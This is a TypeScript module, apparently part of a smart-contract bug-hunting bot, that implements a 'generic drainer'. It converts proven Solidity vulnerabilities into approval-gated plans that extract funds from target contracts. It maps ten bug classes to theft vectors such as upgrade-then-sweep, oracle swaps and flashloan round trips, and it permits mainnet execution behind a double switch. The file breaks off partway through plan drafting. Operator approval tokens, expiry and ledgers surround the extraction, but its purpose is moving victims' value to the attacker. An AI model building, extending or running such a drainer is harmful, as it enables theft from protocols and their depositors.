/**
 * Drain — generic, approval-gated value extraction.
 *
 * The operator's requirement, verbatim: "It should be a generic drainer too but
 * only on my approval." Both halves are load-bearing and this file is the whole
 * of the answer to them.
 *
 * ── HALF ONE: GENERIC ───────────────────────────────────────────────────────
 * The extraction skeleton is the same regardless of how authority was obtained.
 * Whether a bug class gave us a reentrant callback, an unguarded initializer, a
 * forged signature or a manipulable price, the *extraction* is always: acquire
 * the right to move value, then move it, then convert and unwind. So this
 * module knows NOTHING about individual bug classes except which extraction
 * vector each class can plausibly feed (DRAIN_CLASSES) and what to call them in
 * the operator's review. All ten of the bot's Solidity classes are first-class:
 *
 *   sol.reentrancy  sol.accesscontrol  sol.upgrade   sol.oracle   sol.rounding
 *   sol.inflation   sol.dos            sol.delegatecall  sol.signature  sol.flashloan
 *
 * Adding an eleventh class means adding one row to DRAIN_CLASSES. It does not
 * mean touching the refusal ladder, the accounting, or the executor.
 *
 * ── HALF TWO: ONLY ON APPROVAL ──────────────────────────────────────────────
 * There is no default approval, no inferred approval, no "approved because the
 * finding was proven", no env-var fallback and no batching. `DrainApproval` is a
 * single-use, expiring token bound by hash to ONE exact drain plan. This module
 * contains no function that mints, derives, defaults or upgrades an approval —
 * that absence is deliberate and is asserted by a test. If a caller has no
 * approval object, the only thing available here is a refusal.
 *
 * The ladder is checked twice: once in `planDrain` (so the operator never sees a
 * plan that could not run) and again immediately before the wire in
 * `executeDrain` (so revoking an approval, or letting it expire, mid-flight
 * stops execution before anything is signed). Same reason send.ts checks
 * its own ladder twice.
 *
 * ── LAYERING ────────────────────────────────────────────────────────────────
 *   planDrain(input)     PURE. No I/O, no mutation, deterministic. Returns the
 *                        reviewable plan or a typed refusal.
 *   executeDrain(input)  Runs the plan: fork simulation -> control simulation ->
 *                        delta accounting -> pre-wire re-check -> relay.
 *
 * Real broadcasting is NEVER implemented here. It is delegated to the already
 * tested `SendRelay` in send.ts, which keeps its own nine interlocks. This
 * module builds a per-drain `LiveWriteGrant` from the *already validated*
 * approval and passes `dry_run` / `confirm_mainnet` straight through. We do not
 * sign, we do not hold keys, and we do not touch that ladder.
 *
 * BOUNDARY: no key material is read, referenced, stored or logged anywhere in
 * this file. There is no `Signer` construction here — it is passed in.
 */

import { SendRelay, type ChainRpc, type LiveWriteGrant, type SendResult, type Signer } from './send.js';
import type { PocSpec } from './poc.js';
import type { ProofResult } from './proof.js';

/**
 * The only two fields a drain needs from a PocSpec: which harness proved it, and
 * which control makes that proof attributable.
 *
 * Declared structurally rather than as `PocSpec` on purpose. `PocSpec` grows as
 * the PoC generator learns new honesty properties (it gained nocond_name and
 * self_deployed while this file was being written), and a drain plan has no
 * business breaking because a sibling module added a field it does not read.
 * A real `PocSpec` satisfies this interface, so callers pass one unchanged.
 */
export interface HarnessPair {
  test_name: string;
  control_name: string;
}

// ── classes and vectors ──────────────────────────────────────────────────────

/** Every Solidity bug class the bot hunts. All of them can feed a drain. */
export type DrainClass =
  | 'sol.reentrancy'
  | 'sol.accesscontrol'
  | 'sol.upgrade'
  | 'sol.oracle'
  | 'sol.rounding'
  | 'sol.inflation'
  | 'sol.dos'
  | 'sol.delegatecall'
  | 'sol.signature'
  | 'sol.flashloan';

/**
 * The extraction step kinds. This vocabulary is bug-class-agnostic on purpose:
 * it describes what happens to value, not why we are allowed to do it.
 */
export type DrainStepKind = 'approve' | 'call' | 'pull' | 'swap' | 'unwind';

/** Canonical relative order. A plan may repeat a kind but may not go backwards. */
export const VECTOR_ORDER: readonly DrainStepKind[] = ['approve', 'call', 'pull', 'swap', 'unwind'];

export type ExtractionVector =
  | 'direct_pull'
  | 'approve_then_pull'
  | 'mint_then_redeem'
  | 'flashloan_roundtrip'
  | 'oracle_swap'
  | 'upgrade_then_sweep';

export interface VectorSpec {
  /** kinds that must appear at least once */
  requires: readonly DrainStepKind[];
  /** what this vector means, for the operator's review */
  note: string;
}

export const EXTRACTION_VECTORS: Record<ExtractionVector, VectorSpec> = {
  direct_pull: {
    requires: ['pull'],
    note: 'call the value-moving entrypoint as the attacker and receive the funds directly',
  },
  approve_then_pull: {
    requires: ['approve', 'pull'],
    note: 'establish an allowance we control, then pull against it',
  },
  mint_then_redeem: {
    requires: ['call', 'pull'],
    note: 'mint or credit an inflated share balance, then redeem it for the underlying',
  },
  flashloan_roundtrip: {
    requires: ['call', 'pull', 'unwind'],
    note: 'borrow within the transaction, extract while the borrowed capital is live, then repay',
  },
  oracle_swap: {
    requires: ['call', 'swap', 'unwind'],
    note: 'move a price the protocol trusts, act on the distorted price, then restore the market',
  },
  upgrade_then_sweep: {
    requires: ['call', 'pull'],
    note: 'redirect code or ownership to ourselves, then sweep the contract it now controls',
  },
};

export interface ClassSpec {
  /** how authority is normally obtained for this class — documentation only */
  authority: string;
  /** vectors this class can plausibly feed */
  vectors: readonly ExtractionVector[];
}

/**
 * The generic-ness table. Ten classes, one ladder, one accounting model.
 *
 * `vectors` is a plausibility filter, not a security control: the security
 * control is that the *proof* must already be 'proven' before any of this is
 * reachable. The filter exists so an operator reviewing a plan is never handed
 * "denial-of-service -> flashloan roundtrip", which would mean something is
 * wrong upstream.
 */
export const DRAIN_CLASSES: Record<DrainClass, ClassSpec> = {
  'sol.reentrancy': {
    authority: 'reentrant callback re-enters before the accounting write',
    vectors: ['direct_pull', 'mint_then_redeem', 'approve_then_pull'],
  },
  'sol.accesscontrol': {
    authority: 'an unprivileged account reaches a privileged function',
    vectors: ['direct_pull', 'upgrade_then_sweep', 'approve_then_pull'],
  },
  'sol.upgrade': {
    authority: 'uninitialised or re-initialisable proxy / implementation',
    vectors: ['upgrade_then_sweep', 'direct_pull'],
  },
  'sol.oracle': {
    authority: 'a single-transaction price move the protocol consumes',
    vectors: ['oracle_swap', 'direct_pull'],
  },
  'sol.rounding': {
    authority: 'truncation in share/asset maths favours the caller',
    vectors: ['mint_then_redeem', 'direct_pull'],
  },
  'sol.inflation': {
    authority: 'first-depositor / donation inflation of share price',
    vectors: ['mint_then_redeem', 'direct_pull'],
  },
  'sol.dos': {
    authority: 'forced state or a blocked exit that strands value we can take',
    vectors: ['direct_pull'],
  },
  'sol.delegatecall': {
    authority: 'attacker-controlled delegatecall target or calldata',
    vectors: ['upgrade_then_sweep', 'direct_pull'],
  },
  'sol.signature': {
    authority: 'signature replay / malleability / missing signer check',
    vectors: ['approve_then_pull', 'direct_pull'],
  },
  'sol.flashloan': {
    authority: 'uncollateralised capital inside one transaction',
    vectors: ['flashloan_roundtrip', 'oracle_swap', 'direct_pull'],
  },
};

/** Chains the drainer will plan against without a mainnet double-switch. */
export const DRAIN_ALLOWED_CHAINS: readonly number[] = [84532, 11155111, 31337];

/** Chains that additionally need approval.allow_mainnet AND confirm_mainnet. */
export const DRAIN_MAINNET_CHAINS: readonly number[] = [1, 8453];

export const MAX_DATA_BYTES = 24_576;

// ── sha-256 (pure, synchronous) ──────────────────────────────────────────────
//
// Approval binding needs a real digest, and WebCrypto's subtle.digest is async.
// planDrain must stay synchronous and pure, so the digest is implemented here.
// It is verified against published NIST vectors in drain.test.mjs ("abc",
// "", the 448-bit boundary and a 1MB string), which is the reason it is allowed
// to exist at all: a wrong hash would silently weaken the binding.
//
// If you change this function, the test vectors must still pass.

const SHA_K = new Uint32Array([
  0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
  0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
  0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
  0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
  0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
  0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
  0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
  0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
]);

const rotr = (x: number, n: number): number => ((x >>> n) | (x << (32 - n))) >>> 0;

/** SHA-256 of a UTF-8 string, lowercase hex. */
export function sha256Hex(input: string): string {
  const bytes = new TextEncoder().encode(input);
  const len = bytes.length;
  const total = ((len + 9 + 63) >> 6) << 6; // multiple of 64, >= len + 9
  const buf = new Uint8Array(total);
  buf.set(bytes);
  buf[len] = 0x80;
  const view = new DataView(buf.buffer);
  const bits = len * 8;
  view.setUint32(total - 8, Math.floor(bits / 0x100000000), false);
  view.setUint32(total - 4, bits >>> 0, false);

  let h0 = 0x6a09e667;
  let h1 = 0xbb67ae85;
  let h2 = 0x3c6ef372;
  let h3 = 0xa54ff53a;
  let h4 = 0x510e527f;
  let h5 = 0x9b05688c;
  let h6 = 0x1f83d9ab;
  let h7 = 0x5be0cd19;

  const w = new Uint32Array(64);
  for (let off = 0; off < total; off += 64) {
    for (let t = 0; t < 16; t++) w[t] = view.getUint32(off + t * 4, false);
    for (let t = 16; t < 64; t++) {
      const x = w[t - 15] as number;
      const y = w[t - 2] as number;
      const s0 = (rotr(x, 7) ^ rotr(x, 18) ^ (x >>> 3)) >>> 0;
      const s1 = (rotr(y, 17) ^ rotr(y, 19) ^ (y >>> 10)) >>> 0;
      w[t] = ((w[t - 16] as number) + s0 + (w[t - 7] as number) + s1) >>> 0;
    }
    let a = h0;
    let b = h1;
    let c = h2;
    let d = h3;
    let e = h4;
    let f = h5;
    let g = h6;
    let h = h7;
    for (let t = 0; t < 64; t++) {
      const bigS1 = (rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)) >>> 0;
      const ch = ((e & f) ^ (~e & g)) >>> 0;
      const t1 = (h + bigS1 + ch + (SHA_K[t] as number) + (w[t] as number)) >>> 0;
      const bigS0 = (rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)) >>> 0;
      const maj = ((a & b) ^ (a & c) ^ (b & c)) >>> 0;
      const t2 = (bigS0 + maj) >>> 0;
      h = g;
      g = f;
      f = e;
      e = (d + t1) >>> 0;
      d = c;
      c = b;
      b = a;
      a = (t1 + t2) >>> 0;
    }
    h0 = (h0 + a) >>> 0;
    h1 = (h1 + b) >>> 0;
    h2 = (h2 + c) >>> 0;
    h3 = (h3 + d) >>> 0;
    h4 = (h4 + e) >>> 0;
    h5 = (h5 + f) >>> 0;
    h6 = (h6 + g) >>> 0;
    h7 = (h7 + h) >>> 0;
  }

  const out = [h0, h1, h2, h3, h4, h5, h6, h7]
    .map((v) => v.toString(16).padStart(8, '0'))
    .join('');
  return out;
}

// ── types ────────────────────────────────────────────────────────────────────

/** One concrete leg of the extraction, as supplied by the caller. */
export interface DrainLeg {
  kind: DrainStepKind;
  /** contract this leg calls */
  to: string;
  /** 0x-prefixed calldata */
  data: string;
  /** native value attached to the call — counts as capital the attacker spends */
  value_wei: bigint;
  /**
   * capital the attacker must ALREADY hold to perform this leg (e.g. the input
   * side of a swap). Counts towards capital_in so it cannot be forgotten.
   */
  prefunded_wei?: bigint;
  /** expected change to the attacker's balance from this leg alone (net, signed) */
  expected_delta_wei: bigint;
  /** who performs the leg. Anything other than 'attacker' is refused. */
  as?: 'attacker';
  /** this leg is the extraction step. At least one is required for a control. */
  exploit?: boolean;
  note?: string;
}

/** A leg after the plan has numbered and validated it. */
export interface DrainStep {
  index: number;
  kind: DrainStepKind;
  to: string;
  data: string;
  value_wei: bigint;
  prefunded_wei: bigint;
  expected_delta_wei: bigint;
  as: 'attacker';
  exploit: boolean;
  note: string;
}

export interface DrainPlan {
  /** content-addressed: drain_<16 hex of fingerprint> */
  drain_id: string;
  /** sha-256 of the canonical plan body; what an approval is bound to */
  fingerprint: string;
  class: DrainClass;
  vector: ExtractionVector;
  target: string;
  chain_id: number;
  asset: string;
  steps: readonly DrainStep[];
  /** indexes of the steps that constitute the exploit */
  attack_step_indexes: readonly number[];
  /** the control run is structurally defined: the same plan with those steps removed */
  control_removed_step_indexes: readonly number[];
  fork_block: number;
  /** provenance: what proved this, so the plan cannot be detached from its proof */
  proof_test_name: string;
  proof_control_name: string;
  proof_claim: string;
  gross_out_wei: bigint;
  capital_in_wei: bigint;
  net_wei: bigint;
  declared_capital_in_wei: bigint;
}

export interface DrainApproval {
  /** must be literally `true`. "true", 1, {} and undefined are all refused. */
  approved: true;
  /** who is approving. An anonymous approval is not an approval. */
  operator: string;
  /** the exact plan this authorises */
  plan_fingerprint: string;
  /** single-use id, recorded on consumption */
  nonce: string;
  /** unix seconds */
  expires_at: number;
  /** the operator's own ceiling on gross extraction */
  max_value_wei: bigint;
  /** one of the two mainnet switches */
  allow_mainnet?: boolean;
}

export type DrainRefusalCode =
  // ── about the finding ──
  | 'no_proof'
  | 'verdict_not_proven'
  | 'proof_claim_missing'
  | 'no_control_run'
  | 'class_not_supported'
  | 'vector_not_supported'
  | 'vector_not_supported_for_class'
  // ── about the plan shape ──
  | 'plan_invalid'
  | 'legs_incomplete'
  | 'legs_out_of_order'
  | 'privileged_role_required'
  | 'capital_unaccounted'
  | 'capital_exceeds_extraction'
  | 'no_positive_delta'
  // ── about the approval ──
  | 'no_approval'
  | 'approval_not_approved'
  | 'approval_no_operator'
  | 'approval_plan_mismatch'
  | 'approval_expired'
  | 'approval_consumed'
  | 'approval_revoked'
  | 'no_ledger'
  // ── about the chain / size ──
  | 'chain_not_allowed'
  | 'mainnet_needs_double_confirm'
  | 'value_over_cap'
  | 'data_too_large'
  // ── about execution ──
  | 'plan_signature_mismatch'
  | 'no_exec'
  | 'simulation_failed'
  | 'control_failed'
  | 'control_not_clean'
  | 'no_measured_gain'
  | 'no_victim_loss'
  | 'relay_refused';

export interface DrainRefusal {
  refused: true;
  code: DrainRefusalCode;
  reason: string;
}

/** True iff the value is a refusal. Plans carry no `refused` key at all. */
export function isRefusal(x: DrainPlan | DrainRefusal): x is DrainRefusal {
  return (x as DrainRefusal).refused === true;
}

export function refusal(code: DrainRefusalCode, reason: string): DrainRefusal {
  return { refused: true, code, reason };
}

// ── the approval ledger ──────────────────────────────────────────────────────

export interface LedgerEntry {
  nonce: string;
  plan_fingerprint: string;
  at: number;
  event: 'consumed' | 'revoked';
  operator: string;
}

/**
 * Records consumed and revoked approvals so a replay fails.
 *
 * Deliberately NOT persisted here: this module owns no storage. A production
 * caller must back it with the same durable store the engagement already uses,
 * otherwise single-use only holds inside one process. That limitation is stated
 * in EVIDENCE.md rather than papered over.
 */
export class ApprovalLedger {
  private readonly consumedSet = new Set<string>();
  private readonly revokedSet = new Set<string>();
  private readonly journal: LedgerEntry[] = [];

  isConsumed(nonce: string): boolean {
    return this.consumedSet.has(nonce);
  }

  isRevoked(nonce: string): boolean {
    return this.revokedSet.has(nonce);
  }

  /** True iff this exact nonce has been used or pulled. */
  isSpent(nonce: string): boolean {
    return this.consumedSet.has(nonce) || this.revokedSet.has(nonce);
  }

  /**
   * Claim a nonce for one execution. Returns false if it was already used or
   * revoked — the caller turns that into a refusal, never into a retry.
   */
  consume(nonce: string, planFingerprint: string, operator: string, at: number): boolean {
    if (typeof nonce !== 'string' || nonce === '') return false;
    if (this.isSpent(nonce)) return false;
    this.consumedSet.add(nonce);
    this.journal.push({ nonce, plan_fingerprint: planFingerprint, at, event: 'consumed', operator });
    return true;
  }

  /** Withdraw an approval. Takes effect at the next interlock check, including mid-flight. */
  revoke(nonce: string, planFingerprint = '', operator = '', at = 0): void {
    if (typeof nonce !== 'string' || nonce === '') return;
    this.revokedSet.add(nonce);
    this.journal.push({ nonce, plan_fingerprint: planFingerprint, at, event: 'revoked', operator });
  }

  entries(): readonly LedgerEntry[] {
    return this.journal;
  }
}

// ── plan input ───────────────────────────────────────────────────────────────

export interface DrainInput {
  /** the adjudicated proof. verdict must be exactly 'proven'. */
  proof?: ProofResult | null;
  /** the harness pair that produced it; supplies test_name + control_name */
  poc?: HarnessPair | PocSpec | null;
  target?: string;
  chain_id?: number;
  class?: DrainClass;
  vector?: ExtractionVector;
  /** 'native' or a 0x token address */
  asset?: string;
  legs?: DrainLeg[];
  /** operator's per-drain permission. Absent => refuse. */
  approval?: DrainApproval | null;
  /** call-site mainnet switch (the second of two) */
  confirm_mainnet?: boolean;
  /** injectable clock, unix seconds */
  now?: number;
  /** consumed/revoked approval record. Absent => refuse (single-use needs it). */
  ledger?: ApprovalLedger | null;
  fork_block?: number;
  /** capital the plan declares the attacker must supply; must match the legs */
  declared_capital_in_wei?: bigint;
}

// ── shape helpers ────────────────────────────────────────────────────────────

const HEX_ADDR = /^0x[0-9a-fA-F]{40}$/;
const HEX_DATA = /^0x([0-9a-fA-F]{2})*$/;

function isBig(v: unknown): v is bigint {
  return typeof v === 'bigint';
}

function isObj(v: unknown): v is Record<string, unknown> {
  return typeof v === 'object' && v !== null && !Array.isArray(v);
}

function isMainnetChain(id: number): boolean {
  return DRAIN_MAINNET_CHAINS.includes(id);
}

/** Pretty wei for the operator's review. Not used in any decision. */
export function formatWei(v: bigint): string {
  const neg = v < 0n;
  const abs = neg ? -v : v;
  const whole = abs / 10n ** 18n;
  const frac = (abs % 10n ** 18n).toString().padStart(18, '0').replace(/0+$/, '');
  return `${neg ? '-' : ''}${whole}${frac === '' ? '' : `.${frac}`}`;
}

// ── fingerprint ──────────────────────────────────────────────────────────────

interface FingerprintBody {
  class: DrainClass;
  vector: ExtractionVector;
  target: string;
  chain_id: number;
  asset: string;
  steps: readonly DrainStep[];
  attack_step_indexes: readonly number[];
  fork_block: number;
  proof_test_name: string;
  proof_control_name: string;
  proof_claim: string;
  gross_out_wei: bigint;
  capital_in_wei: bigint;
  net_wei: bigint;
}

/**
 * The canonical body. Fixed key order, lowercased addresses, bigints as decimal
 * strings — so the digest is stable across engines and across serialisation.
 */
function canonicalBody(b: FingerprintBody): string {
  return JSON.stringify({
    v: 1,
    cls: b.class,
    vec: b.vector,
    t: b.target.toLowerCase(),
    c: b.chain_id,
    a: b.asset.toLowerCase(),
    s: b.steps.map((s) => [
      s.index,
      s.kind,
      s.to.toLowerCase(),
      s.data.toLowerCase(),
      s.value_wei.toString(),
      s.prefunded_wei.toString(),
      s.expected_delta_wei.toString(),
      s.as,
      s.exploit ? 1 : 0,
    ]),
    x: b.attack_step_indexes.slice(),
    fb: b.fork_block,
    pt: b.proof_test_name,
    ct: b.proof_control_name,
    pc: b.proof_claim,
    go: b.gross_out_wei.toString(),
    ci: b.capital_in_wei.toString(),
    n: b.net_wei.toString(),
  });
}

/** Digest of a plan, recomputed from its own fields. */
export function planFingerprint(p: DrainPlan): string {
  return sha256Hex(canonicalBody(p));
}

/** True iff the plan's stored fingerprint still matches its own body. */
export function planSignatureValid(p: DrainPlan): boolean {
  return typeof p.fingerprint === 'string' && planFingerprint(p) === p.fingerprint;
}

// ── the ladder ───────────────────────────────────────────────────────────────

/**
 * The approval half of the ladder, split out because it is the only part that
 * must be re-evaluated mid-flight (executeDrain calls this twice).
 *
 * Reads the ledger; never mutates it.
 */
function checkApproval(
  plan: Pick<DrainPlan, 'fingerprint' | 'gross_out_wei' | 'chain_id'>,
  approval: DrainApproval | null | undefined,
  ledger: ApprovalLedger | null | undefined,
  now: number,
  confirmMainnet: boolean,
): DrainRefusal | null {
  // (1) an approval object must exist at all
  if (!approval || !isObj(approval)) {
    return refusal(
      'no_approval',
      'no DrainApproval supplied; a drain requires an explicit per-drain operator approval',
    );
  }

  // (2) it must be literally approved. Truthiness is not permission.
  if (approval.approved !== true) {
    return refusal(
      'approval_not_approved',
      `approval.approved is ${JSON.stringify(
        (approval as { approved?: unknown }).approved,
      )} (${typeof (approval as { approved?: unknown }).approved}); only literal true is an approval`,
    );
  }

  // (3) a named operator
  if (typeof approval.operator !== 'string' || approval.operator.trim() === '') {
    return refusal('approval_no_operator', 'approval.operator is empty; an anonymous approval is not an approval');
  }

  // (4) bound to THIS drain, by hash — not to "the engagement"
  if (
    typeof approval.plan_fingerprint !== 'string' ||
    approval.plan_fingerprint.toLowerCase() !== plan.fingerprint.toLowerCase()
  ) {
    return refusal(
      'approval_plan_mismatch',
      `approval is bound to plan ${String(approval.plan_fingerprint).slice(0, 16)}… but this drain is ` +
        `${plan.fingerprint.slice(0, 16)}…; approving one plan never authorises another`,
    );
  }

  if (typeof approval.nonce !== 'string' || approval.nonce.trim() === '') {
    return refusal('plan_invalid', 'approval.nonce is empty; a single-use approval needs a nonce');
  }

  // (5) expiry. Injected clock so this is testable and so it can be re-checked.
  if (!Number.isFinite(now)) {
    return refusal('plan_invalid', 'clock is not a finite number');
  }
  if (typeof approval.expires_at !== 'number' || !Number.isFinite(approval.expires_at)) {
    return refusal('plan_invalid', 'approval.expires_at is not a finite number of unix seconds');
  }
  if (now > approval.expires_at) {
    return refusal(
      'approval_expired',
      `approval expired at ${approval.expires_at} (now ${Math.floor(now)}); ask the operator for a fresh one`,
    );
  }

  // (6) single use, and revocation always wins
  if (!ledger || !(ledger instanceof ApprovalLedger)) {
    return refusal(
      'no_ledger',
      'no ApprovalLedger supplied; without a consumed-approval record a second run could reuse this approval',
    );
  }
  if (ledger.isRevoked(approval.nonce)) {
    return refusal('approval_revoked', 'this approval has been revoked by the operator');
  }
  if (ledger.isConsumed(approval.nonce)) {
    return refusal(
      'approval_consumed',
      'this approval has already been consumed; a second drain needs a new approval',
    );
  }

  // (7) the operator's ceiling on gross extraction
  if (!isBig(approval.max_value_wei)) {
    return refusal('plan_invalid', 'approval.max_value_wei must be a bigint (wei), not a number or string');
  }
  if (approval.max_value_wei < 0n) {
    return refusal('plan_invalid', 'approval.max_value_wei is negative');
  }
  if (plan.gross_out_wei > approval.max_value_wei) {
    return refusal(
      'value_over_cap',
      `plan extracts ${plan.gross_out_wei} wei which exceeds the approval cap of ${approval.max_value_wei} wei`,
    );
  }

  // (8) mainnet double switch (both, not either).
  //
  // The chain ALLOWLIST is enforced one level up, in draftDrain: whether a chain
  // is supported at all is a property of the plan, not of the permission, and an
  // operator must never be handed a draft for a chain this build cannot run. The
  // double switch stays here because it is genuinely about permission.
  const chainId = plan.chain_id;
  if (isMainnetChain(chainId)) {
    const approvalSide = approval.allow_mainnet === true;
    const callSide = confirmMainnet === true;
    if (!approvalSide || !callSide) {
      return refusal(
        'mainnet_needs_double_confirm',
        `chain ${chainId} is mainnet and needs approval.allow_mainnet AND confirm_mainnet ` +
          `(got allow_mainnet=${approvalSide}, confirm_mainnet=${callSide})`,
      );
    }
  }

  return null;
}

// ── planDrain ────────────────────────────────────────────────────────────────

/**
 * Build the plan body WITHOUT consulting the approval.
 *
 * This exists because the approval has to be bound to a fingerprint that does
 * not exist until the plan does — the operator is shown a draft, reads it, and
 * only then can sign it. Splitting it here keeps `planDrain` honest: the draft
 * path can never be mistaken for a permission, and it is impossible to reach
 * execution through it because `executeDrain` calls `planDrain`, not this.
 *
 * It still enforces every *plan-shape* rule (proven verdict, control run,
 * class/vector, ordering, capital accounting, positive delta) because a plan
 * that could not legally run must never be shown to an operator as approvable.
 */
export function draftDrain(input: DrainInput): DrainPlan | DrainRefusal {
  // ── 1. the finding ────────────────────────────────────────────────────────
  const proof = input.proof;
  if (!proof || !isObj(proof) || typeof proof.verdict !== 'string') {
    return refusal('no_proof', 'no ProofResult supplied; a drain must be downstream of an adjudicated proof');
  }
  if (proof.verdict !== 'proven') {
    return refusal(
      'verdict_not_proven',
      `verdict is '${proof.verdict}'; only exactly 'proven' may reach a drain plan`,
    );
  }
  // A proven verdict always carries a claim (judge() guarantees it). If it does
  // not, the object did not come from judge() and we will not build on it.
  if (typeof proof.claim !== 'string' || proof.claim.trim() === '') {
    return refusal(
      'proof_claim_missing',
      "verdict is 'proven' but no claim is attached; a proven result always names the measured effect",
    );
  }

  const poc = input.poc;
  if (!poc || !isObj(poc) || typeof poc.test_name !== 'string' || poc.test_name.trim() === '') {
    return refusal('plan_invalid', 'no PocSpec.test_name; the plan must name the harness that proved it');
  }
  // The control run is not optional decoration: without it an extraction is not
  // attributable. The PoC declares the control; no control name means no control.
  if (typeof poc.control_name !== 'string' || poc.control_name.trim() === '') {
    return refusal(
      'no_control_run',
      'the PoC declares no control_name; an extraction without a control run is not attributable',
    );
  }

  // ── 2. class / vector ────────────────────────────────────────────────────
  const cls = input.class;
  if (typeof cls !== 'string' || !Object.prototype.hasOwnProperty.call(DRAIN_CLASSES, cls)) {
    return refusal(
      'class_not_supported',
      `class '${String(cls)}' is not one of the ${Object.keys(DRAIN_CLASSES).length} drainable classes`,
    );
  }
  const classSpec = DRAIN_CLASSES[cls as DrainClass];

  const vec = input.vector;
  if (typeof vec !== 'string' || !Object.prototype.hasOwnProperty.call(EXTRACTION_VECTORS, vec)) {
    return refusal(
      'vector_not_supported',
      `vector '${String(vec)}' is not one of ${Object.keys(EXTRACTION_VECTORS).join(', ')}`,
    );
  }
  const vectorId = vec as ExtractionVector;
  if (!classSpec.vectors.includes(vectorId)) {
    return refusal(
      'vector_not_supported_for_class',
      `vector '${vectorId}' cannot carry class '${cls}' (that class feeds: ${classSpec.vectors.join(', ')})`,
    );
  }
  const vectorSpec = EXTRACTION_VECTORS[vectorId];

  // ── 3. plan shape ────────────────────────────────────────────────────────
  const target = input.target;
  if (typeof target !== 'string' || !HEX_ADDR.test(target)) {
    return refusal('plan_invalid', 'target is not a 0x-prefixed 20-byte address');
  }
  const chainId = input.chain_id;
  if (typeof chainId !== 'number' || !Number.isInteger(chainId)) {
    return refusal('plan_invalid', 'chain_id is not an integer');
  }
  // Support for the chain itself is a plan property: never draft on a chain this
  // build cannot execute, so the operator is never shown an unrunnable plan.
  if (!DRAIN_ALLOWED_CHAINS.includes(chainId) && !isMainnetChain(chainId)) {
    return refusal(
      'chain_not_allowed',
      `chain ${chainId} is not on the drain allowlist (${DRAIN_ALLOWED_CHAINS.join(', ')} plus mainnet ` +
        `${DRAIN_MAINNET_CHAINS.join('/')} with a double switch)`,
    );
  }
  const asset = typeof input.asset === 'string' && input.asset !== '' ? input.asset : 'native';
  if (asset !== 'native' && !HEX_ADDR.test(asset)) {
    return refusal('plan_invalid', "asset must be 'native' or a 0x-prefixed 20-byte token address");
  }
  const forkBlock = input.fork_block ?? 0;
  if (!Number.isInteger(forkBlock) || forkBlock < 0) {
    return refusal('plan_invalid', 'fork_block is not a non-negative integer');
  }

  const legs = input.legs;
  if (!Array.isArray(legs) || legs.length === 0) {
    return refusal('plan_invalid', 'legs is empty; a drain plan is an ordered list of concrete steps');
  }
  if (legs.length > 64) {
    return refusal('plan_invalid', `legs has ${legs.length} entries; 64 is the ceiling for one reviewable plan`);
  }

  const steps: DrainStep[] = [];
  let capitalIn = 0n;
  let grossOut = 0n;
  let grossCost = 0n;
  let lastOrder = -1;

  for (let i = 0; i < legs.length; i++) {
    const leg = legs[i] as DrainLeg;
    if (!leg || !isObj(leg)) {
      return refusal('plan_invalid', `leg ${i} is not an object`);
    }
    const kindIdx = VECTOR_ORDER.indexOf(leg.kind);
    if (kindIdx < 0) {
      return refusal('plan_invalid', `leg ${i} has unknown kind '${String(leg.kind)}'`);
    }
    if (kindIdx < lastOrder) {
      return refusal(
        'legs_out_of_order',
        `leg ${i} ('${leg.kind}') comes after a later kind; steps must follow ${VECTOR_ORDER.join(' -> ')}`,
      );
    }
    lastOrder = kindIdx;

    if (typeof leg.to !== 'string' || !HEX_ADDR.test(leg.to)) {
      return refusal('plan_invalid', `leg ${i}.to is not a 0x-prefixed 20-byte address`);
    }
    if (typeof leg.data !== 'string' || !HEX_DATA.test(leg.data)) {
      return refusal('plan_invalid', `leg ${i}.data is not 0x-prefixed hex`);
    }
    if ((leg.data.length - 2) / 2 > MAX_DATA_BYTES) {
      return refusal('data_too_large', `leg ${i}.data exceeds ${MAX_DATA_BYTES} bytes`);
    }
    if (!isBig(leg.value_wei) || leg.value_wei < 0n) {
      return refusal('plan_invalid', `leg ${i}.value_wei must be a non-negative bigint (wei)`);
    }
    const prefunded = leg.prefunded_wei ?? 0n;
    if (!isBig(prefunded) || prefunded < 0n) {
      return refusal('plan_invalid', `leg ${i}.prefunded_wei must be a non-negative bigint (wei)`);
    }
    if (!isBig(leg.expected_delta_wei)) {
      return refusal('plan_invalid', `leg ${i}.expected_delta_wei must be a bigint (wei, signed)`);
    }
    // Generic-ness must not become a way to smuggle a privileged call into an
    // "unprivileged" plan. Only the attacker may act.
    if (leg.as !== undefined && leg.as !== 'attacker') {
      return refusal(
        'privileged_role_required',
        `leg ${i} runs as '${String(leg.as)}'; a drain must not need a privileged role, only the attacker's`,
      );
    }

    capitalIn += leg.value_wei + prefunded;
    if (leg.expected_delta_wei > 0n) grossOut += leg.expected_delta_wei;
    else grossCost += -leg.expected_delta_wei;

    steps.push({
      index: i,
      kind: leg.kind,
      to: leg.to,
      data: leg.data,
      value_wei: leg.value_wei,
      prefunded_wei: prefunded,
      expected_delta_wei: leg.expected_delta_wei,
      as: 'attacker',
      exploit: leg.exploit === true,
      note: typeof leg.note === 'string' ? leg.note : '',
    });
  }

  // required kinds for the chosen vector
  const provided = new Set(steps.map((s) => s.kind));
  const missing = vectorSpec.requires.filter((k) => !provided.has(k));
  if (missing.length > 0) {
    return refusal(
      'legs_incomplete',
      `vector '${vectorId}' requires ${vectorSpec.requires.join(', ')}; missing ${missing.join(', ')}`,
    );
  }

  // ── 4. the control ───────────────────────────────────────────────────────
